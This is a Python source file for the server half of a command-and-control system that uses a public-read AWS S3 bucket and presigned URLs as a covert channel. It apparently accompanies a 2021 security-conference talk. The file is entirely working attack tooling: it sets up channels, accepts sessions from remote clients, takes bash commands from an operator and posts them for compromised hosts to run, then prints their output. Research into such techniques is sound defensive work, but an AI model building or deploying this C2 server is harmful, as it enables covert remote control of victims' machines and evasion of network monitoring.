#!/usr/bin/python

import time
import threading
import uuid
import boto3
from datetime import datetime
from typing import Any, Optional

# Shared constants between client and server
CONST_CHANNEL_COUNT = 5
CONST_BUCKET_REGION = "eu-west-1"
CONST_CHANNEL_PREFIX = "cnc-channel"
CONST_CNC_BUCKET = "hitbsecconf2021ams-s3-cnc"
CONST_MSG_FROM_CLIENT = "client.msg"
CONST_MSG_FROM_SERVER = "server.msg"
CONST_PRIV_SESSION_PREFIX = "sessions"

# C&C server constants
CONST_1_HOUR = 3600
CONST_LINK_TTL_SEC = 25 * CONST_1_HOUR
CONST_CHANNEL_REFRESH_INTERVAL = CONST_LINK_TTL_SEC - CONST_1_HOUR
CONST_CHANNEL_SESSION_PREFIX = "session-request"


def _delete_object(key: str) -> Optional[Any]:
    try:
        response = boto3.client("s3").delete_object(Bucket=CONST_CNC_BUCKET, Key=key)
        return response
    except:
        return None


def _get_object(key: str) -> Any:
    try:
        response = boto3.client("s3").get_object(Bucket=CONST_CNC_BUCKET, Key=key)
        return response.get("Body").read().decode("utf-8")
    except:
        return ""


def _list_objects(prefix: str) -> Any:
    try:
        response = boto3.client("s3").list_objects_v2(
            Bucket=CONST_CNC_BUCKET, Prefix=prefix
        )

        return response.get("Contents", [])
    except:
        return []


def _put_object(content: str, key: str) -> Optional[Any]:
    try:
        return boto3.client("s3").put_object(
            ACL="public-read",
            Body=content.encode("utf-8"),
            Bucket=CONST_CNC_BUCKET,
            Key=key,
        )
    except:
        return None


# Signing happens locally, no network API call
def _sign_s3_url(bucket: str, key: str, action: str, http_method: str) -> str:
    signed_url = boto3.client("s3").generate_presigned_url(
        ClientMethod=action,
        Params={"Bucket": bucket, "Key": key},
        ExpiresIn=CONST_LINK_TTL_SEC,
        HttpMethod=http_method,
    )

    target_region = f"s3-{CONST_BUCKET_REGION}.amazonaws.com"
    return str(signed_url.replace("s3.amazonaws.com", target_region))


####################################################################################################


def init_channel(number: int) -> None:
    channel_name: str = f"{CONST_CHANNEL_PREFIX}-{number}"
    tx_id = f"{CONST_CHANNEL_SESSION_PREFIX}-{uuid.uuid4().hex}"
    channel_url = _sign_s3_url(CONST_CNC_BUCKET, tx_id, "put_object", "PUT")
    _put_object(channel_url, channel_name)


def process_session_request() -> None:
    for message in _list_objects(CONST_CHANNEL_SESSION_PREFIX):
        session_request_key = message.get("Key")
        channel_id, session_id = _get_object(session_request_key).split("\n")
        _delete_object(session_request_key)

        # Reinitialize channel to prevent collision between different C&C client
        init_channel(channel_id)

        # Create separate session for the C&C client
        tx_id = f"{CONST_PRIV_SESSION_PREFIX}.{session_id}"
        client_msg = f"{CONST_MSG_FROM_CLIENT}.{session_id}"
        session_url = _sign_s3_url(CONST_CNC_BUCKET, client_msg, "put_object", "PUT")
        _put_object(session_url, tx_id)


def read_response() -> None:
    for message in _list_objects(CONST_MSG_FROM_CLIENT):
        client_msg_key = message.get("Key", "")
        client_msg = _get_object(client_msg_key)
        _delete_object(client_msg_key)
        print(f"\n[{datetime.utcnow()}] Message from client\n{client_msg}")


def send_command(command: str) -> None:
    for message in _list_objects(CONST_PRIV_SESSION_PREFIX):
        prefix, session_id = message.get("Key").split(".")
        tx_id = f"{CONST_MSG_FROM_SERVER}.{session_id}"
        command_url = _sign_s3_url(CONST_CNC_BUCKET, tx_id, "delete_object", "DELETE")
        payload = f"{command_url}\n{command}"
        _put_object(payload, tx_id)


def startup_initialization() -> None:
    # Reset all sessions on startup
    for message in _list_objects(CONST_MSG_FROM_CLIENT):
        _delete_object(message.get("Key"))

    for message in _list_objects(CONST_MSG_FROM_SERVER):
        _delete_object(message.get("Key"))

    for message in _list_objects(CONST_PRIV_SESSION_PREFIX):
        _delete_object(message.get("Key"))

    print(f"[{datetime.utcnow()}] Initializing channels...")

    # Initialize all channels on startup
    for count in range(CONST_CHANNEL_COUNT):
        init_channel(count)

    print(f"[{datetime.utcnow()}] Channels initialized.")


def cnc_server() -> None:
    tick_count = 0

    while cnc_start:
        # Force all channels update before presigned URL expiry
        if tick_count > CONST_CHANNEL_REFRESH_INTERVAL:
            tick_count = 0

            for count in range(CONST_CHANNEL_COUNT):
                init_channel(count)

        # Poll for incoming session request
        else:
            tick_count += 1
            time.sleep(1)
            process_session_request()
            read_response()


if __name__ == "__main__":
    startup_initialization()
    cnc_start = True
    threading.Thread(target=cnc_server).start()

    try:

        while True:
            command = input(f"[{datetime.utcnow()}] Enter bash command: ")
            send_command(command)
    except:
        cnc_start = False
        print(f"\n[{datetime.utcnow()}] Exiting...")
